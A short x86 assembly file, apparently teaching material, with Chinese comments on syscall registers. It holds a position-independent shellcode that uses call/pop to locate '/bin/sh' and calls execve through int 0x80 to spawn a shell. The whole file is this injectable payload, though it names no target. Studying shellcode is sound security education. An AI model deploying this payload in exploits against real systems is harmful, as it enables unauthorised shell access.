.global _start
.text
# evecve(filename, arg, env)
# %eax保存系统调用号，%ebx保存第一个参数，%ecx保存第二个参数
_start:
    call next
next:
    pop %ebx
    addl $(data-next), %ebx 
    movl $11, %eax
    xor %ecx, %ecx
    xor %edx, %edx
    int $0x80

data:
    .asciz "/bin/sh"
